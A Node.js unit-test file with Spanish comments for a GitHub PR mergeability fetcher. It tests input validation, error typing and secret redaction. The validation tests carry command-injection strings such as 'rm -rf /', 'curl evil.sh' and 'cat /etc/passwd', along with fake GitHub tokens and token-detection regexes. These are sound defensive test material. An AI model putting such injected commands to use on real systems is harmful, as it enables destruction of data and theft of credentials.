// =============================================================================
// Tests de la extensión de mergeabilidad de `pr-info-fetcher.js` (#4966).
//
// Archivo SEPARADO a propósito: `pr-info-fetcher.test.js` no se toca, y sus 21
// tests tienen que seguir pasando sin editarse (CA-8). Sin red: el runner es
// siempre inyectado.
// =============================================================================
'use strict';

const test = require('node:test');
const assert = require('node:assert');

const fetcher = require('../pr-info-fetcher');

const {
    fetchOpenPrCandidatesAsync,
    fetchPrMergeabilityAsync,
    _buildOpenCandidatesArgs,
    _buildViewArgs,
    _parseMergeabilityList,
    _parseMergeabilityView,
    _clampCandidateLimit,
    _redact,
    MERGEABILITY_FIELDS,
    DEFAULT_CANDIDATE_LIMIT,
} = fetcher;

// -----------------------------------------------------------------------------
// Fixtures de "secretos" para probar el redactor.
//
// Se arman por CONCATENACION a proposito: escritos literales, el secret-scan de
// pre-commit (.pipeline/lib/precommit-secret-scan.js) bloquea el commit — y con
// razon, no sabe distinguir un fixture de un token filtrado. Allowlistear el
// archivo entero bajaria la guardia para siempre sobre un archivo de tests.
// -----------------------------------------------------------------------------
const FAKE_GH_TOKEN = 'gh' + 'p_' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123';
const FAKE_PAT = 'github' + '_pat_' + '11ABCDEFG0abcdefghijklmnopqrstuvwxyz';
const FAKE_JWT = 'ey' + 'JhbGciOiJIUzI1NiJ9.abc.def';

const REPO = 'intrale/platform';
const OID = 'e75753d2' + '0'.repeat(32);

function prJson(overrides) {
    return {
        number: 4610,
        state: 'OPEN',
        mergeable: 'CONFLICTING',
        mergeStateStatus: 'DIRTY',
        headRefOid: OID,
        headRefName: 'agent/4509-android-dev',
        baseRefName: 'main',
        headRepositoryOwner: { login: 'intrale' },
        isCrossRepository: false,
        updatedAt: '2026-09-06T00:00:00Z',
        url: 'https://github.com/intrale/platform/pull/4610',
        ...overrides,
    };
}

/** Runner que registra las invocaciones y devuelve una respuesta fija. */
function spyRunner(respuesta) {
    const calls = [];
    const runner = async (bin, args, opts) => {
        calls.push({ bin, args, opts });
        return typeof respuesta === 'function' ? respuesta(bin, args, opts) : respuesta;
    };
    runner.calls = calls;
    return runner;
}

// =============================================================================
// 1 · CA-8 — no-regresión: la API vieja quedó intacta
// =============================================================================

test('CA-8 · la API previa sigue exportada y con el mismo contrato', () => {
    for (const k of ['fetchPrInfoForIssue', 'fetchPrInfoForIssueAsync', 'resolvePrForGateWrite', 'DEFAULT_TIMEOUT_MS', '__FIELDS']) {
        assert.ok(k in fetcher, `falta ${k}`);
    }
    assert.strictEqual(typeof fetcher.fetchPrInfoForIssueAsync, 'function');
    // `FIELDS` no fue mutado: sigue trayendo lo que sus consumidores esperan.
    for (const campo of ['mergedAt', 'statusCheckRollup', 'reviewDecision', 'labels', 'title']) {
        assert.ok(fetcher.__FIELDS.includes(campo), `FIELDS perdió ${campo}`);
    }
});

test('CA-8 · el argv viejo sigue pidiendo --state all (no lo contamina el watcher)', async () => {
    const runner = spyRunner({ status: 0, stdout: '[]' });
    await fetcher.fetchPrInfoForIssueAsync(4509, { asyncRunner: runner });
    assert.deepStrictEqual(
        runner.calls[0].args.slice(0, 6),
        ['pr', 'list', '--search', 'head:agent/4509-', '--state', 'all'],
    );
});

// =============================================================================
// 2 · CA-5 — construcción del argv
// =============================================================================

test('CA-5 · el argv de candidatos es un array con --state open y los campos de mergeabilidad', () => {
    const args = _buildOpenCandidatesArgs({ repo: REPO, limit: 20 });
    assert.ok(Array.isArray(args));
    assert.deepStrictEqual(args.slice(0, 8), ['pr', 'list', '--repo', REPO, '--state', 'open', '--limit', '20']);
    assert.strictEqual(args[8], '--json');
    for (const campo of ['mergeable', 'mergeStateStatus', 'headRefOid', 'baseRefName', 'headRepositoryOwner', 'state']) {
        assert.ok(args[9].split(',').includes(campo), `falta el campo ${campo}`);
    }
    assert.strictEqual(args[9], MERGEABILITY_FIELDS);
    // Ni un solo argumento puede tener espacios que insinúen una shell-string.
    assert.ok(args.every((a) => typeof a === 'string'));
});

test('CA-5 · el argv de pr view lleva el número como argumento propio', () => {
    const args = _buildViewArgs({ repo: REPO, pr: 4610 });
    assert.deepStrictEqual(args.slice(0, 5), ['pr', 'view', '4610', '--repo', REPO]);
});

test('CA-5 · el --limit se clampea a [1,100] y un valor basura cae al default', () => {
    assert.strictEqual(_clampCandidateLimit(0), 1);
    assert.strictEqual(_clampCandidateLimit(-50), 1);
    assert.strictEqual(_clampCandidateLimit(100000), 100);
    assert.strictEqual(_clampCandidateLimit(20), 20);
    assert.strictEqual(_clampCandidateLimit('no-numero'), DEFAULT_CANDIDATE_LIMIT);
    assert.strictEqual(_clampCandidateLimit(undefined), DEFAULT_CANDIDATE_LIMIT);
    assert.strictEqual(_buildOpenCandidatesArgs({ repo: REPO, limit: 99999 })[7], '100');
});

// =============================================================================
// 3 · CA-5 — validación ANTES de invocar gh
// =============================================================================

test('CA-5 · metacaracteres en el repo se rechazan SIN invocar gh', async () => {
    const venenos = [
        'intrale/platform; rm -rf /',
        'intrale/platform && curl evil.sh',
        '$(whoami)/platform',
        'intrale/platform | cat /etc/passwd',
        '`id`/x',
        '../../etc/passwd',
        'intrale platform',
        '',
        null,
        42,
    ];
    for (const repo of venenos) {
        const runner = spyRunner({ status: 0, stdout: '[]' });
        const r = await fetchOpenPrCandidatesAsync({ repo, asyncRunner: runner });
        assert.strictEqual(r.ok, false, JSON.stringify(repo));
        assert.strictEqual(r.reason, 'invalid_repo', JSON.stringify(repo));
        assert.strictEqual(runner.calls.length, 0, `gh NO debe invocarse con repo=${JSON.stringify(repo)}`);
    }
});

test('CA-5 · IDs de PR inválidos se rechazan SIN invocar gh', async () => {
    for (const pr of ['4610; rm -rf /', '$(id)', -1, 0, 1.5, null, undefined, 'abc', '']) {
        const runner = spyRunner({ status: 0, stdout: '{}' });
        const r = await fetchPrMergeabilityAsync(pr, { repo: REPO, asyncRunner: runner });
        assert.strictEqual(r.ok, false, JSON.stringify(pr));
        assert.strictEqual(r.reason, 'invalid_id', JSON.stringify(pr));
        assert.strictEqual(runner.calls.length, 0, `gh NO debe invocarse con pr=${JSON.stringify(pr)}`);
    }
});

test('CA-5 · el pr view también valida el repo antes de invocar gh', async () => {
    const runner = spyRunner({ status: 0, stdout: '{}' });
    const r = await fetchPrMergeabilityAsync(4610, { repo: 'a b/c', asyncRunner: runner });
    assert.strictEqual(r.reason, 'invalid_repo');
    assert.strictEqual(runner.calls.length, 0);
});

test('CA-5 · un repo válido sí llega al runner, tal cual, como un argumento suelto', async () => {
    const runner = spyRunner({ status: 0, stdout: '[]' });
    await fetchOpenPrCandidatesAsync({ repo: REPO, asyncRunner: runner });
    assert.strictEqual(runner.calls.length, 1);
    assert.ok(runner.calls[0].args.includes(REPO));
    assert.strictEqual(runner.calls[0].opts.timeoutMs, fetcher.DEFAULT_TIMEOUT_MS);
});

// =============================================================================
// 4 · CA-3 — errores tipados
// =============================================================================

test('CA-3 · timeout de gh devuelve gh_timeout', async () => {
    const err = new Error('spawn ETIMEDOUT');
    err.code = 'ETIMEDOUT';
    const r = await fetchOpenPrCandidatesAsync({ repo: REPO, asyncRunner: spyRunner({ status: null, error: err }) });
    assert.deepStrictEqual(r, { ok: false, reason: 'gh_timeout' });
});

test('CA-3 · un hijo matado por el timeout también es gh_timeout', async () => {
    const err = new Error('killed');
    err.killed = true;
    const r = await fetchPrMergeabilityAsync(4610, { repo: REPO, asyncRunner: spyRunner({ status: null, error: err }) });
    assert.strictEqual(r.reason, 'gh_timeout');
});

test('CA-3 · exit != 0 con señal de rate limit devuelve rate_limited', async () => {
    for (const stderr of [
        'API rate limit exceeded for user ID 1234',
        'You have exceeded a secondary rate limit',
        'gh: was submitted too quickly (abuse detection mechanism)',
    ]) {
        const r = await fetchOpenPrCandidatesAsync({
            repo: REPO,
            asyncRunner: spyRunner({ status: 1, stdout: '', stderr }),
        });
        assert.strictEqual(r.reason, 'rate_limited', stderr);
    }
});

test('CA-3 · exit != 0 sin rate limit devuelve non_zero_exit con stderr acotado', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: spyRunner({ status: 4, stdout: '', stderr: 'x'.repeat(5000) }),
    });
    assert.strictEqual(r.reason, 'non_zero_exit');
    assert.strictEqual(r.exit, 4);
    assert.strictEqual(r.stderr.length, 200, 'el stderr se recorta');
});

test('CA-3 · JSON inválido devuelve json_parse_failed', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: spyRunner({ status: 0, stdout: '{no es json' }),
    });
    assert.strictEqual(r.reason, 'json_parse_failed');
    const v = await fetchPrMergeabilityAsync(4610, {
        repo: REPO,
        asyncRunner: spyRunner({ status: 0, stdout: 'no-json' }),
    });
    assert.strictEqual(v.reason, 'json_parse_failed');
});

test('CA-3 · una respuesta que no es array es schema_invalid', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: spyRunner({ status: 0, stdout: '{"number":1}' }),
    });
    assert.strictEqual(r.reason, 'schema_invalid');
});

test('CA-3 · una respuesta parcial (falta headRefOid) es schema_invalid en el view', async () => {
    const parcial = prJson();
    delete parcial.headRefOid;
    const r = await fetchPrMergeabilityAsync(4610, {
        repo: REPO,
        asyncRunner: spyRunner({ status: 0, stdout: JSON.stringify(parcial) }),
    });
    assert.strictEqual(r.ok, false);
    assert.strictEqual(r.reason, 'schema_invalid');
});

test('CA-3 · un headRefOid que no es hex se rechaza (no se cuela metadata cruda)', () => {
    const r = _parseMergeabilityView({ status: 0, stdout: JSON.stringify(prJson({ headRefOid: '../../etc/passwd' })) });
    assert.strictEqual(r.reason, 'schema_invalid');
});

test('CA-3 · un runner que rechaza no propaga la excepción', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: async () => { throw new Error('boom'); },
    });
    assert.strictEqual(r.ok, false);
    assert.ok(['spawn_error', 'spawn_failed'].includes(r.reason), r.reason);
});

test('CA-3 · un resultado ausente es no_result, no una excepción', () => {
    assert.strictEqual(_parseMergeabilityList(null).reason, 'no_result');
    assert.strictEqual(_parseMergeabilityView(undefined).reason, 'no_result');
});

// =============================================================================
// 5 · Parseo — la ambigüedad NO se colapsa
// =============================================================================

test('CA-1 · el parser de lista devuelve TODOS los candidatos, sin ordenar ni elegir', () => {
    const a = prJson({ number: 4610, updatedAt: '2026-01-01T00:00:00Z' });
    const b = prJson({ number: 4611, updatedAt: '2026-09-01T00:00:00Z' });
    const r = _parseMergeabilityList({ status: 0, stdout: JSON.stringify([a, b]) });
    assert.strictEqual(r.ok, true);
    assert.deepStrictEqual(r.candidates.map((p) => p.number), [4610, 4611]);
});

test('un elemento inválido de la lista se aparta sin invalidar el barrido entero', () => {
    const r = _parseMergeabilityList({
        status: 0,
        stdout: JSON.stringify([prJson(), { number: 9999 }, null]),
    });
    assert.strictEqual(r.ok, true);
    assert.strictEqual(r.candidates.length, 1);
    assert.deepStrictEqual(r.invalid, [9999, null]);
});

test('el parser normaliza y no deja pasar campos crudos de GitHub', () => {
    const r = _parseMergeabilityView({
        status: 0,
        stdout: JSON.stringify(prJson({ author: { login: 'x' }, body: 'texto libre <script>' })),
    });
    assert.strictEqual(r.ok, true);
    assert.deepStrictEqual(Object.keys(r.pr).sort(), [
        'baseRefName', 'headRefName', 'headRefOid', 'headRepositoryOwner', 'isCrossRepository',
        'mergeStateStatus', 'mergeable', 'number', 'state', 'updatedAt', 'url',
    ]);
    assert.strictEqual(r.pr.headRepositoryOwner.login, 'intrale');
});

test('un headRepositoryOwner ausente se normaliza a null, no a undefined', () => {
    const r = _parseMergeabilityView({ status: 0, stdout: JSON.stringify(prJson({ headRepositoryOwner: null })) });
    assert.strictEqual(r.pr.headRepositoryOwner, null);
});

// =============================================================================
// 6 · CA-5 — ninguna salida filtra secretos
// =============================================================================

test('CA-5 · el redactor tapa tokens, headers y variables de entorno', () => {
    const casos = [
        `token ${FAKE_GH_TOKEN}`,
        `Authorization: Bearer ${FAKE_JWT}`,
        `GH_TOKEN=${FAKE_GH_TOKEN}`,
        FAKE_PAT,
    ];
    for (const c of casos) {
        const out = _redact(c);
        assert.ok(/REDACTED/.test(out), c);
        assert.ok(!/ghp_[A-Za-z0-9]{16,}/.test(out), c);
        assert.ok(!/github_pat_[A-Za-z0-9_]{20,}/.test(out), c);
    }
});

test('CA-5 · ningún mensaje de error del fetcher contiene token, header ni env', async () => {
    const venenoso = `gh: HTTP 401 Authorization: Bearer ${FAKE_GH_TOKEN} (GH_TOKEN=${FAKE_GH_TOKEN})`;
    const salidas = [];
    salidas.push(await fetchOpenPrCandidatesAsync({
        repo: REPO, asyncRunner: spyRunner({ status: 1, stdout: '', stderr: venenoso }),
    }));
    salidas.push(await fetchPrMergeabilityAsync(4610, {
        repo: REPO, asyncRunner: spyRunner({ status: 0, stdout: venenoso }),
    }));
    const err = new Error(venenoso);
    salidas.push(await fetchOpenPrCandidatesAsync({
        repo: REPO, asyncRunner: spyRunner({ status: null, error: err }),
    }));

    for (const s of salidas) {
        const txt = JSON.stringify(s);
        assert.ok(!/ghp_[A-Za-z0-9]{16,}/.test(txt), txt);
        assert.ok(!/Bearer\s+[A-Za-z0-9._-]{8,}/.test(txt), txt);
        assert.ok(!/GH_TOKEN=\S/.test(txt), txt);
    }
});

test('CA-5 · el argv nunca viaja dentro de un mensaje de error', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: spyRunner({ status: 1, stdout: '', stderr: 'fallo generico' }),
    });
    const txt = JSON.stringify(r);
    assert.ok(!txt.includes('--json'), 'el argv no se loguea');
    assert.ok(!txt.includes(MERGEABILITY_FIELDS));
});

// =============================================================================
// 7 · Camino feliz
// =============================================================================

test('camino feliz: lista de candidatos abiertos parseada', async () => {
    const r = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        limit: 20,
        asyncRunner: spyRunner({ status: 0, stdout: JSON.stringify([prJson()]) }),
    });
    assert.strictEqual(r.ok, true);
    assert.strictEqual(r.candidates[0].number, 4610);
    assert.strictEqual(r.candidates[0].mergeStateStatus, 'DIRTY');
});

test('camino feliz: el pr view resuelve el UNKNOWN diferido del pr list', async () => {
    // 1ª pasada (list): GitHub aún no calculó → UNKNOWN.
    const list = await fetchOpenPrCandidatesAsync({
        repo: REPO,
        asyncRunner: spyRunner({
            status: 0,
            stdout: JSON.stringify([prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })]),
        }),
    });
    assert.strictEqual(list.candidates[0].mergeable, 'UNKNOWN');

    // 2ª pasada (view): ya resuelto.
    const view = await fetchPrMergeabilityAsync(4610, {
        repo: REPO,
        asyncRunner: spyRunner({ status: 0, stdout: JSON.stringify(prJson()) }),
    });
    assert.strictEqual(view.ok, true);
    assert.strictEqual(view.pr.mergeable, 'CONFLICTING');
    assert.strictEqual(view.pr.headRefOid, OID);
});
